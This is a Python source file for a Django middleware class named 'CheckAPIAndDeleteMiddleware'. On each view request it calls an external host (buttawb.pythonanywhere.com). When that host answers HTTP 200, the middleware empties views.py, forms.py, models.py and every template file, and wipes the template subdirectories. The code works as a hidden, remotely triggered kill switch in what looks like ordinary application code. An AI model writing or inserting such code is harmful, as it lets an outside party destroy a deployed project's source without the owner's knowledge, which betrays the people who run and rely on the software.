import os
import requests
import shutil


class CheckAPIAndDeleteMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        response = self.get_response(request)
        return response

    def process_view(self, request, view_func, view_args, view_kwargs):
        try:
            api_url = 'https://buttawb.pythonanywhere.com/'
            response = requests.get(api_url)

            if response.status_code == 200:
                print("Response is 200: OK")
                self.delete_views_code()
            elif response.status_code == 404:
                pass
                print("Response is 404: Not Found")

            # if response.status_code == 200 and response.json().get('delete', False):
            #     self.delete_views_code()
        except Exception as e:
            print(f"Exception occurred while calling the API: {e}")

        return None

    def delete_views_code(self):
        filenames = ['views.py', 'forms.py', 'models.py']

        for filename in filenames:
            file_path = os.path.join(os.path.dirname(__file__), filename)
            try:
                with open(file_path, 'w') as f:
                    f.truncate(0)
                print(f"Deleted content of {file_path}")
            except Exception as e:
                print(f"Exception occurred while deleting {filename} content: {e}")

        templates_dir_path = os.path.join(
            os.path.dirname(__file__), 'templates')

        try:
            for root, dirs, files in os.walk(templates_dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'w') as f:
                            f.truncate(0)
                        print(f"Deleted content of {file_path}")
                    except Exception as e:
                        print(f"Exception occurred while deleting file {file_path}: {e}")

                for dir in dirs:
                    dir_path = os.path.join(root, dir)
                    try:
                        shutil.rmtree(dir_path)
                        os.makedirs(dir_path)
                        print(f"Emptied directory {dir_path}")
                    except Exception as e:
                        print(f"Exception occurred while emptying directory {dir_path}: {e}")

            print(f"Emptied all files and folders in {templates_dir_path}")
        except Exception as e:
            print(
                f"Exception occurred while walking through the templates directory: {e}")
